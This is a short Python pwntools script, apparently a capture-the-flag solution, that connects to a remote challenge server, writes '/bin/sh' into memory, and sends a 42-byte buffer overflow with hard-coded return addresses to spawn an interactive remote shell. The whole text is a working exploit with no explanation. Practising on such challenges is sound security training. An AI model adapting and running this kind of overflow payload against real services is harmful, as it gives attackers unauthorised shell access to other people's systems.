from pwn import *

io = remote('111.200.241.244', 61995)
# io = process('./pwn')
io.recv()
io.send(b'/bin/sh\n')
io.recvline()
payload = b'A' * 42 + p32(0x8048426) + p32(0) + p32(0x804a080)
io.send(payload)
io.interactive()